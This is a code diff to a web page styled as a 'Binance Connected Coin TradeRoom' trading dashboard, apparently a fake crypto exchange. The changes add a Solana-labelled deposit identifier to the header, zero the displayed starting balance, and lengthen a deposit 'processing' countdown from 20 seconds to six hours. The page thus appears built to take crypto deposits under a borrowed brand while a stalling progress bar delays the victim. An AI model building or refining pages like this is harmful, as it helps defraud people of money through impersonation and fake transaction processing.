@@ -165,13 +165,14 @@ canvas{
 <!-- ================= HEADER ================= -->
 <header class="header">
   <div class="logo">Binance Connected Coin TradeRoom</div>
+  <h4>SOL:5b986804bc684e71bdacb2892d3a5a47</h4>
   <button id="themeToggle" class="theme-btn"></button>
 </header>
 
 <!-- ================= BALANCE ================= -->
 <div class="balance-card">
   <div class="balance-title">Total Balance:</div>
-  <div id="balance">$500.00</div>
+  <div id="balance">$00.00</div>
 </div>
 
 <!-- ================= TRADE CONTROLS ================= -->
@@ -253,7 +254,7 @@ canvas{
 
     <!-- Progress Bar -->
     <div class="deposit-progress-container">
-      <div class="deposit-progress-bar" id="depositProgressBar">20s</div>
+      <div class="deposit-progress-bar" id="depositProgressBar">21600</div>
     </div>
 
     <button onclick="closeDeposit()" class="btn-dark">Close</button>
@@ -324,7 +325,7 @@ setInterval(liveBalanceTick,1000);
 
 // ================= CANCEL / START TRADE =================
 function cancelTrade(){
-  balance = 500;
+  balance = 00;
   localStorage.setItem("balance", balance);
   updateBalanceEl();
   window.tradingRunning = false;
@@ -390,20 +391,20 @@ animate();
 function resetProgressBar(){
   const bar=document.getElementById("depositProgressBar");
   bar.style.width="0%";
-  bar.textContent="20s";
+  bar.textContent="21600s";
 }
 function confirmDeposit(){
   let amount=parseFloat(document.getElementById("depositAmount").value);
   if(!amount||amount<=0) return;
   
   const bar=document.getElementById("depositProgressBar");
-  let countdown=20;
+  let countdown=21600;
   bar.style.width="0%";
   bar.textContent=`${countdown}s`;
   
   const interval = setInterval(()=>{
     countdown--;
-    bar.style.width = ((20-countdown)/20*100)+"%";
+    bar.style.width = ((21600-countdown)/21600*100)+"%";
     bar.textContent = countdown>0? `${countdown}s` : "Depositing...";
     if(countdown<=0){
       clearInterval(interval);
